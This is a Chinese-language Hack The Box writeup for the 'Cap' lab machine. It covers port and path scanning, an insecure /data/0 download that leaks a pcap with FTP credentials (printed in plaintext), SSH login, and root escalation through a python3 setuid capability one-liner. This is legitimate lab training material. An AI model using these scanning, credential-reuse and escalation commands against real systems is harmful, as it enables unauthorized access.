---
title: Cap (Hack The Box Writeup)
date: 2021-08-14T13:50:00+08:00
draft: false
url: "/2021/08/14/cap-hack-the-box-writeup/"
categories:
  - 滲透測試
  - Hack The Box
showToc: true
TocOpen: false
---

> 
URL : https://app.hackthebox.eu/machines/351

IP : 10.10.10.245

## Recon

- 剛開始先掃 Port`rustscan -a 10.10.10.245 -r 1-65535`![](/uploads/2022/02/b48a4-4gU7VjE.png)`nmap -A -p21,22,80 10.10.10.245`- ![](/uploads/2022/02/a9da1-X9G4Ex0.png)觀察有開的 port- 22
- 21 : vsFTPd 3.0.3
- 80掃路徑- `python3 dirsearch.py -u http://10.10.10.245/`
- ![](/uploads/2022/02/c12c2-VMXpQXN.png)
- 基本上都還是跳轉回首頁，沒什麼 QQ觀察首頁- ![](/uploads/2022/02/bee5c-CEJGwJX.png)觀察下載的 `/data` 發現預設是從 2 開始- 嘗試改 `1` 會出現空白
- 嘗試改 `0`http://10.10.10.245/data/0
- 可以下載到一包 pcap 檔案分析 pcap 檔案- ![](/uploads/2022/02/6d038-zTczoQL.png)
- 可以找到 ftp 的登入帳密`nathan`
- `Buck3tH4TF0RM3!`

## 進入系統

- 直接 ssh 連上![](/uploads/2022/02/b4e6f-df5oKQ6.png)取得 user flag- ![](/uploads/2022/02/c5591-0csJWzg.png)

## 提權

- 準備 LinEnum![](/uploads/2022/02/27d2e-l2wJjWi.png)執行 LinEnum- `bash LinEnum.sh`
- ![](/uploads/2022/02/efbef-L9Nzc9m.png)發現 python3 有 capability- ![](/uploads/2022/02/bdd3c-T9C0VOz.png)GTFOBins 尋找 Py capability 解法- https://gtfobins.github.io/gtfobins/python/#capabilities
- `/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'`取得 Root Shell 與 Flag- ![](/uploads/2022/02/4b579-Hq1HAFS.png)
